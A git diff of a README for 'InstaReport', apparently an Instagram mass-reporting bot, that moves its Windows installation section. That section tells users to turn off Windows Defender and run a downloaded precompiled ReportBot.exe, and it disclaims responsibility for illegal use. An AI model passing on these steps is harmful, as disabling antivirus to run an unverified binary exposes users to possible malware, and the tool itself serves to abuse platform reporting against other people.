@@ -33,6 +33,14 @@ No need to install git in linux or termux
 
 # Usage 
 
+### INSTALLATION [Windows]
+[Direct Download Compiled Version](https://github.com/CyberRats/InstaReport/releases/tag/v1)
+
+* `Turn Off Windows Defender`
+* `Unzip The File`
+* `Star ReportBot.exe`
+* 
+[ - ] We're Not Responible for any kind of illegal activity !
 
 ### INSTALLATION [Termux] (Not working for android right now) 
 
@@ -46,15 +54,6 @@ No need to install git in linux or termux
 * `pip install -r requirements.txt`
 * `chmod +x *`
 * `bash setup.sh` OR `python ReportBot.py`
-
-### INSTALLATION [Windows]
-[Direct Download Compiled Version](https://github.com/CyberRats/InstaReport/releases/tag/v1)
-
-* `Turn Off Windows Defender`
-* `Unzip The File`
-* `Star ReportBot.exe`
-* 
-[ - ] We're Not Responible for any kind of illegal activity !
 
 ### INSTALLATION [Kali Linux]
 
